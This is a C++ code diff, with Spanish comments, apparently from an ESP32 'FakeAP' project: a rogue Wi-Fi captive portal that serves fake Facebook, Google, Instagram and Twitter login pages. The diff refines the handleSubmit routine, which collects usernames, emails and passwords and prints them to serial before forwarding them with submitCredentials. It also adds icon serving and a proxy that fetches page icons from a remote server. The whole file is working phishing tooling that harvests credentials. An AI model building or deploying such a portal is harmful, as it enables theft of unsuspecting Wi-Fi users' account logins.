@@ -21,18 +21,22 @@ FakeAP::FakeAP(const uint8_t &port)
 {
 }
 
+
 void FakeAP::handleSubmit(void)
 {
 	// variables para almacenar temporalmente las entradas del usuario
-	String credentials = "uid: " + m_server->arg("username");
-	// String password
-	credentials.concat("\npsw: " + m_server->arg("password"));
+	String userID = "";
+	if(m_server->hasArg("username"))   userID += m_server->arg("username");
+	else if(m_server->hasArg("email")) userID += m_server->arg("email");
+
+	String userPass = m_server->arg("password");
+	String plarform = m_server->arg("platform");
 
 	// se imprime por consola los valores de las entradas
-	Serial.println("Facebook id: " + m_server->arg("username"));
-	Serial.println("Password: " + m_server->arg("password"));
+	Serial.printf("Nuevas credenciales:\nPlataforma: %s\n", plarform.c_str());
+	Serial.printf("Usuario: %s\nContraseña: %s\n",userID.c_str(), userPass.c_str());
 
-	if (submitCredentials(m_server->arg("platform"), m_server->arg("username"), m_server->arg("password")))
+	if (submitCredentials(plarform, userID, userPass))
 	{
 		m_sdManager->logEvent("Credentials sent and stored correctly");
 #if (WITH_SUCCESS_MESSAGE)
@@ -47,21 +51,11 @@ void FakeAP::handleSubmit(void)
 	Serial.print(" hosts conectados.\n");
 }
 
+
 void FakeAP::handleLogin()
 {
 	if (m_server->method() == HTTP_GET)
 	{
-		/*
-		auto platform = [this] () -> Platform_t {
-			String str = m_server->arg("platform");
-
-			if 		(str == "facebook")  return FACEBOOK;
-			else if (str == "google") 	 return GOOGLE;
-			else if (str == "instagram") return INSTAGRAM;
-			else if (str == "twitter") 	 return TWITTER;
-		};
-		*/
-
 		if (getLoginPage(m_server->arg("platform")))
 		{
 			m_server->send(200, "text/html", _pageContent);
@@ -80,32 +74,60 @@ void FakeAP::handleIcons(void)
 		m_server->send(400, "text/plain", "");
 		return;
 	}
-	int platform = m_server->arg("icon-name").toInt();
+	int platform = m_server->arg("icon-name").charAt(0);
 
 	Serial.println("Server icon argument: " + m_server->arg("icon-name"));
+	Serial.println("Plarform value: " + String(platform));
 
 	String temp;
 	switch (platform)
 	{
 	case FACEBOOK:
 		temp = "/icons/icons8-facebook-48.svg";
+		break;
 	case GOOGLE:
 		temp = "/icons/icons8-google-48.svg";
+		break;
 	case INSTAGRAM:
 		temp = "/icons/icons8-instagram-48.svg";
+		break;
 	case TWITTER:
 		temp = "/icons/icons8-twitterx-48.svg";
+		break;
 	default:
-		temp = "/icons/icons8-wifi.gif";
+		temp = "/icons/public-wifi-5403_128.gif";
+		break;
 	}
 
 	Serial.println("Temp var value: " + temp);
 
-	String content = m_sdManager->readFile(
-		m_sdManager->getFileDir(m_indexPage) + temp);
+	File file = m_sdManager->getFileSystem().open(
+					m_sdManager->getFileDir(m_indexPage) + temp);
 
-	m_server->send(200, content.endsWith(".svg")? 
-						"image/svg+xml" : "image/gif", content);
+	if(!file)
+	{
+		m_server->send(404, "text/plain", "File not found");
+		return;
+	}
+	String fileName = file.name();
+	size_t fileSize = file.size();
+
+	m_server->sendHeader("Content-Length", String(fileSize));
+	m_server->sendHeader("Cache-Control", "max-age=31536000");
+	m_server->setContentLength(fileSize);
+	m_server->send(200, fileName.endsWith(".svg")? 
+						"image/svg+xml" : "image/gif", "");
+	
+	static const size_t BUFFER_SIZE = 1024;
+    uint8_t buffer[BUFFER_SIZE];
+
+	while(file.available())
+	{
+        size_t bytesRead = file.read(buffer, BUFFER_SIZE);
+        m_server->client().write(buffer, bytesRead);
+    }
+    
+    file.close();
 }
 
 bool FakeAP::initialize(const String &AP_SSID, const String &AP_PSW,
@@ -153,10 +175,73 @@ void FakeAP::printFilesContent()
 	delay(1500);
 }
 
+
+void FakeAP::getImageFile(const String& iconName)
+{
+	if (_client->connect(*_serverIP, 80))
+	{
+		String url = "/get-page-icons?icon-name=" + iconName;
+
+		_client->print(String("GET ") + url + " HTTP/1.1\r\n" +
+						"Host: " + _serverIP->toString() + "\r\n" +
+						"Connection: close\r\n\r\n");
+
+		while (_client->connected() && !_client->available())
+			delay(3);
+
+		int contentLength = -1;
+		bool isImage = 0;
+		while (_client->available())
+		{
+			String line = _client->readStringUntil('\n');
+			if (line.startsWith("Content-Length: "))
+				contentLength = line.substring(16).toInt();
+
+			if (line.startsWith("Content-Type: image/png"))
+            	isImage = true;
+
+			if (line == "\r")
+				break;
+		}
+
+		if (!isImage || contentLength <= 0)
+		{
+			_client->stop();
+			Serial.println(ERROR_SERVER_IMAGE);
+			m_server->send(500, "text/plain", "Invalid response from server");
+			return;
+		}
+
+		m_server->sendHeader("Content-Length", String(contentLength));
+		m_server->sendHeader("Content-Type", "image/png");
+		m_server->setContentLength(contentLength);
+		m_server->send(200, "image/png", "");
+
+		uint8_t buffer[1024];
+		int totalRead = 0;
+		Serial.println("Receiving and sending file bytes to client");
+		while (_client->available() && totalRead < contentLength)
+		{
+			int buffSize = sizeof(buffer);
+			int bytesRead = _client->read(buffer, min(buffSize , contentLength - totalRead));
+			if (bytesRead > 0)
+			{	
+				m_server->client().write(buffer, bytesRead);
+				totalRead += bytesRead;
+			}
+		}
+
+		_client->stop();
+	}
+}
+
 void FakeAP::startCaptiveServer()
 {
 	m_server->on("/", HTTP_GET, [this]()
 				 { handleRoot(); });
+
+	m_server->on("/submit", HTTP_POST, [this]()
+				 { handleSubmit(); });
 
 	m_server->on("/login", HTTP_GET, [this](){
 		if (getLoginPage(m_server->arg("platform"))) 
@@ -174,10 +259,15 @@ void FakeAP::startCaptiveServer()
 							m_sdManager->getFileDir(m_indexPage)
 							+ "/index-styles.css"
 							);
-		m_server->send(200, "text/css", content); });
+		m_server->send(200, "text/css", content);
+	});
 
 	m_server->on("/index/icons", HTTP_GET, [this]()
 				 { handleIcons(); });
+
+	m_server->on("/index/page-icon", HTTP_GET, [this]() {
+				getImageFile(m_server->arg("icon-name")); });
+
 
 	m_server->onNotFound([this]()
 						 { handleRoot(); });
